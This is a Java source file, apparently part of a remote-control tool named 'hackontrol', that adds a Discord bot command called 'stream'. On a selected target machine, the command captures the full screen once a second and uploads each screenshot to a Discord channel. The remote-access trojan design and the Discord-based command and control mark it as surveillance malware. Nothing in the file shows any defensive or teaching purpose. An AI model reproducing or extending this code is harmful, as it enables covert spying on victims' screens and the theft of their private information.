package com.khopan.hackontrol.command;

import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;

import com.khopan.hackontrol.source.CommandSource;
import com.khopan.hackontrol.source.DefaultCommandSource;
import com.mojang.brigadier.CommandDispatcher;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;

import net.dv8tion.jda.api.entities.Message;
import net.dv8tion.jda.api.entities.channel.middleman.MessageChannel;
import net.dv8tion.jda.api.utils.FileUpload;

public class StreamCommand implements Command {
	private Robot robot;
	private Rectangle area;
	private Message message;
	private boolean running;

	@Override
	public void register(CommandDispatcher<CommandSource> dispatcher) {
		dispatcher.register(LiteralArgumentBuilder.<CommandSource>literal("stream").requires(source -> source.isSelected()).then(LiteralArgumentBuilder.<CommandSource>literal("start").executes(context -> {
			CommandSource source = context.getSource();

			if(this.running) {
				source.message("Error: Stream is already started");
				return -1;
			}

			try {
				this.robot = new Robot();
			} catch(Throwable ignored) {
				source.message("Error: Failed to start stream");
				return -1;
			}

			this.area = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
			MessageChannel channel = source.getChannel();
			this.running = true;
			source.message("Stream is successfully started");
			new Thread(() -> {
				while(true) {
					if(!this.running) {
						return;
					}

					long start = System.currentTimeMillis();
					this.stream(channel, source);
					long total = System.currentTimeMillis() - start;
					long sleep = Math.max(1000L - total, 0);

					try {
						Thread.sleep(sleep);
					} catch(Throwable ignored) {

					}
				}
			}).start();

			return 1;
		})).then(LiteralArgumentBuilder.<CommandSource>literal("stop").executes(context -> {
			CommandSource source = context.getSource();

			if(!this.running) {
				source.message("Error: Stream is not started");
				return -1;
			}

			this.running = false;
			this.message = null;
			source.message("Stream is successfully stopped");
			return 1;
		})));
	}

	private void stream(MessageChannel channel, CommandSource source) {
		BufferedImage screenshot = this.robot.createScreenCapture(this.area);
		FileUpload upload = DefaultCommandSource.toFileUpload(screenshot, source);

		if(this.message == null) {
			this.message = channel.sendFiles(upload).complete();
			return;
		}

		this.message = this.message.editMessageAttachments(upload).complete();
	}
}
